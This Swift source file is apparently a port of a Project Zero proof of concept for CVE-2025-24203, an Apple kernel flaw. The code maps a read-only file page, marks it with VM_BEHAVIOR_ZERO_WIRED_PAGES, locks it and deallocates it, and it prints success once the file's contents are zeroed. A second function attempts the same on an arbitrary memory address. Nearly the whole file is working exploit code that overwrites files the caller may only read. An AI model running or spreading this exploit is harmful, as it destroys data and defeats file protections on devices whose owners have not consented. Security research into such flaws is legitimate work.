//
//  unwire_mlock_poc.swift
//  dirtyZero
//
//  Created by Skadz on 5/11/25.
//

//  Full Swift port of unwire_mlock_poc.c from https://project-zero.issues.chromium.org/issues/391518636.
//  CVE-2025-24203 discovered by Ian Beer of Google Project Zero.

import Foundation
import Darwin
import MachO

let pageSize = sysconf(_SC_PAGESIZE)

func mapFilePage(path: String) throws -> UnsafeMutableRawPointer {
    let fd = open(path, O_RDONLY)
    
    guard fd != -1 else {
      throw "open failed"
    }
    
    let mappedAt = mmap(nil, pageSize, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0)
    
    guard mappedAt != MAP_FAILED else {
        close(fd)
        throw "mmap failed"
    }
    
    return mappedAt!
}

func zeroPoC(path: String) throws {
    let page = try mapFilePage(path: path)
    print("mapped file at \(page)")
    
    let pageVmAddress = UInt(bitPattern: page)
    
    var kr = vm_behavior_set(mach_task_self_, pageVmAddress, vm_size_t(pageSize), VM_BEHAVIOR_ZERO_WIRED_PAGES)
    guard kr == KERN_SUCCESS else {
        throw "failed to set VM_BEHAVIOR_ZERO_WIRED_PAGES on the entry"
    }
    
    print("set VM_BEHAVIOR_ZERO_WIRED_PAGES")
    
    let mlockErr = mlock(page, pageSize)
    guard mlockErr == 0 else {
        throw "mlock failed"
    }
    print("mlock success")
    
    kr = vm_deallocate(mach_task_self_, pageVmAddress, vm_size_t(pageSize))
    guard kr == KERN_SUCCESS else {
        throw "vm_deallocate failed: \(String(cString: mach_error_string(kr)))"
    }
    print("deleted map entries before unwiring")
    
    print("[*] Zeroed file successfully!")
}

// just an experiment
func zeroPoC(address: UInt) throws {
    print(String(format: "will zero address %#lx", address))
    
    var kr = vm_behavior_set(mach_task_self_, address, vm_size_t(pageSize), VM_BEHAVIOR_ZERO_WIRED_PAGES)
    guard kr == KERN_SUCCESS else {
        throw "failed to set VM_BEHAVIOR_ZERO_WIRED_PAGES on the entry"
    }
    
    print("set VM_BEHAVIOR_ZERO_WIRED_PAGES")
    
    let mlockErr = mlock(UnsafeRawPointer(bitPattern: address)!, pageSize)
    guard mlockErr == 0 else {
        throw "mlock failed"
    }
    print("mlock success")
    
    kr = vm_deallocate(mach_task_self_, address, vm_size_t(pageSize))
    guard kr == KERN_SUCCESS else {
        throw "vm_deallocate failed: \(String(cString: mach_error_string(kr)))"
    }
    print("deleted map entries before unwiring")
    
    print(String(format: "zeroed %#lx ?", address))
}
